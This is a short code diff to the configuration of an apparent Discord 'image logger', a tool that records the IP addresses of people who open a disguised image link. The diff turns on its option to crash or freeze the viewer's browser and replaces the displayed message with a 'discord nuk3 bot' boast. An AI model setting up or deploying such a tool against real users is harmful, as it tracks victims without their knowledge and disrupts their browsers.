@@ -22,8 +22,8 @@ config = {
 
     # OPTIONS #
     "crashBrowser": {
-        "doCrashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
-        "customMessage": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger",
+        "doCrashBrowser": True, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
+        "customMessage": "This browser has been crashed by doo0415 discord nuk3 bot .gg/pon",
     },
 
     "vpnCheck": 1, # Prevents VPNs from triggering the alert
